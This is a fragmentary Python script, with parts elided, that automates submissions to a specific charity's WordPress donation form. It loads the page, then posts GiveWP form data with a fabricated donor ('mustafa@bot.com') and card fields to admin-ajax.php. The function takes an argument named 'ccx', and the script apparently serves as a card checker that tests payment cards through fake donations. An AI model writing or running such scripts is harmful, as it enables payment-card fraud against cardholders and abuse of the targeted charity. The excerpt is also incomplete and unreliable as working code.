...
def Aizen(ccx):
    ...
    response = r.get('https://cjrimpact.org/donations/425-3-2/', cookies=r.cookies, headers=headers)
    ...
    headers = {
        'origin': 'https://cjrimpact.org',
        'referer': 'https://cjrimpact.org/donations/425-3-2/',
    ...
    data = {
        ...
        'give-form-title': '',
        'give-current-url': 'https://cjrimpact.org/donations/425-3-2/',
        'give-form-url': 'https://cjrimpact.org/donations/425-3-2/',
    ...
    response = r.post('https://cjrimpact.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    ...
    data = MultipartEncoder({
        ...
        'give-current-url': (None, 'https://cjrimpact.org/donations/425-3-2/'),
        'give-form-url': (None, 'https://cjrimpact.org/donations/425-3-2/'),
        ...
        'give_first': (None, 'Mustafa'),
        'give_last': (None, 'Dev'),
        'give_email': (None, 'mustafa@bot.com'),
        'card_name': (None, 'Mustafa '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
    ...
    response = r.post('https://cjrimpact.org/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
